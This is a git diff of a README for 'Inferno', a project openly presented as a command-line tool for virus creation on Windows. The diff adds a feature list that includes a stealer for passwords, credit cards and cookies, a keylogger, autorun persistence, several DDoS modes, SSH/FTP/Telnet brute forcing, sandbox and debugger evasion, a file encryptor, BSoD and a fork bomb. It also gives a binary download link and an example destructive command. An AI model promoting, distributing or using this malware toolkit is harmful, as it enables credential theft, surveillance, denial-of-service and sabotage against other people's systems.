@@ -1,5 +1,5 @@
 # :fire: The Inferno:
-Simple command line tool for virus creation. Written on C#
+Modern command line tool for virus creation. Written on C# for Windows.
 
 <p align="center">
   <img src="images/logo.png"/>
@@ -8,8 +8,16 @@ Simple command line tool for virus creation. Written on C#
 # :warning: Attention:
 * Some antiviruses may remove the program.
 
+# :rose: Features:
+Webcam screenshot, Desktop screenshot, Microphone recorder, Stealer(Passwords, Credit Cards, Cookies, History, Bookmarks), Keylogger, Autorun(Registry, Taskscheduler, StartupDIR), DDoS(HTTP, UDP, SYN, ICMP, SLOWLORIS), Bruteforce (SSH, FTP, Telnet), TaskManager, Port Scanner, Wifi scanner, File encryptor/dycryptor, Get installed antivirus, Check if in VirtualBox, SandBox, Debugger, Power control, Block system input, BSoD, ForkBomb, Text to speech, Clipboard control, System volume control, Send key press, Move cursor, Get cursor position, Get active window title, Get battery status, Min/Max all windows, Change wallpapers, Download & Upload file(anonfile.com), Get BSSID, Get coordinates by BSSID, WHOIS, Geoplugin, VirusTotal checker.
+
 # :page_facing_up: Download:
 * Download [Inferno.zip](https://raw.githubusercontent.com/LimerBoy/Inferno/master/bin/Inferno.zip) for windows.
+
+# :mega: JSON output:
+<p align="center">
+  <img src="images/example.png"/>
+</p>
 
 # :diamonds: Examples:
 * We can type Inferno commands it in command line:  
@@ -41,11 +49,6 @@ Simple command line tool for virus creation. Written on C#
   inferno.exe EVIL_BSOD
   ```
   ![BSOD](images/example4.gif)
-
-# :mega: JSON output:
-<p align="center">
-  <img src="images/example.png"/>
-</p>
 
 
 # :book: All commands:
